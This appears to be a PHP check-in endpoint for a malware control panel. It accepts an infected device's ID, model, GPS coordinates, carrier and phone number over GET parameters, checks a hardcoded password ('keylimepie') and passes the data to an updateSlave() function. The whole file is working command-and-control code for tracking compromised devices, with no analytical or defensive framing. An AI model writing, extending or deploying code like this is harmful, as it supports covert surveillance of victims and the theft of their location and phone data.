<?php

include("functions.php");

if(isset($_GET['UID'], $_GET['Device'], $_GET['Version'], $_GET['Coordinates'], $_GET['Provider'], $_GET['Phone_Number'], $_GET['Password'], $_GET['Sdk'], $_GET['Random'])){
	if($_GET['Password'] == "keylimepie"){
		updateSlave($_GET['UID'], $_GET['Device'], $_GET['Version'], $_GET['Coordinates'], $_GET['Provider'], $_GET['Phone_Number'], $_GET['Sdk'], $_GET['Random']);
	} else {
		echo("Wrong Password!");
	}
} else {
	echo "Missing Values";
}

?>